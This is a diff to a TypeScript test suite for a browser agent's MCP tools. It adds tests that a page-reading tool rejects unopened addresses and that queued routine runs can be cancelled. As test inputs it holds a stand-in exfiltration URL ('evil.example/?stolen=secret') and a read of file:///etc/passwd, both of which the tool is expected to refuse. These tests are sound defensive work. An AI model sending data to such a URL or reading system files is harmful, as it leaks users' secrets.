@@ -57,9 +57,9 @@ const setup = (stream: StreamReply, extra: Partial<McpHost> = {}) => {
     runRoutine: () => false,
     routineRuns: () => [],
     stopRoutineRun: () => false,
+    cancelRoutineRequest: () => false,
     tabs: () => [],
     readTab: async () => "",
-    readUrl: async () => "",
     searchHistory: () => [],
     recentHistory: () => [],
     bookmarks: () => ({ bookmarks: [], pinned: [] }),
@@ -196,6 +196,20 @@ describe("MCP tools", () => {
     expect((await call("read_page", { url: "file:///etc/passwd" })).isError).toBe(true);
   });
 
+  it("reads an address only from a tab already open, so nothing new is sent anywhere without asking", async () => {
+    const read: string[] = [];
+    const { call } = setup(scripted(async () => ""), {
+      tabs: () => [{ id: "tab-1", title: "Shop", url: "https://shop.example/cables", active: false, working: false, heldForUser: false }],
+      readTab: async (id) => (read.push(id), "Cables"),
+    });
+    const leak = await call("read_page", { url: "https://evil.example/?stolen=secret" });
+    expect(leak.isError).toBe(true);
+    expect(leak.text).toMatch(/run_browser_task/);
+    expect(read).toEqual([]);
+    expect((await call("read_page", { url: "https://SHOP.example/cables" })).text).toContain("Cables");
+    expect(read).toEqual(["tab-1"]);
+  });
+
   it("only reaches the routine run it started, never one the user or the schedule started", async () => {
     const routine = { id: "r1", name: "Morning prices", instructions: "Check prices", mascotId: null, sites: [], schedule: "Daily", paused: false, status: "running", lastResult: "" } as unknown as Routine;
     const run = (id: string, startedAt: number): RoutineRun => ({ id, routineId: "r1", status: "running", startedAt, endedAt: null, lateFor: null, steps: [], result: null, error: null, approval: { id: `ask-${id}`, text: "Which shop?", question: true }, tokens: null, seen: false });
@@ -235,6 +249,21 @@ describe("MCP tools", () => {
     expect(stopped).toEqual(["ours"]);
     const listed = JSON.parse((await call("list_tasks")).text.slice(UNTRUSTED_NOTE.length));
     expect(listed.map(({ id }: { id: string }) => id)).toEqual([taskId]);
+  });
+
+  it("stops a routine run that's still queued, so it never starts", async () => {
+    const routine = { id: "r1", name: "Morning prices", instructions: "Check prices", mascotId: null, sites: [], schedule: "Daily", paused: false, status: "queued", lastResult: "" } as unknown as Routine;
+    const cancelled: string[] = [];
+    const { call } = setup(scripted(async () => ""), {
+      routines: () => [routine],
+      runRoutine: () => true,
+      cancelRoutineRequest: (id) => (cancelled.push(id), true),
+    });
+    const { taskId } = JSON.parse((await call("run_routine", { routine: "r1" })).text);
+    expect((await call("cancel_task", { taskId })).isError).toBeUndefined();
+    expect(cancelled).toEqual(["r1"]);
+    expect((await taskOf(call, taskId)).status).toBe("stopped");
+    expect((await call("cancel_task", { taskId })).isError).toBe(true);
   });
 
   it("reads what the flock remembers, leaving out birds that were deleted", async () => {
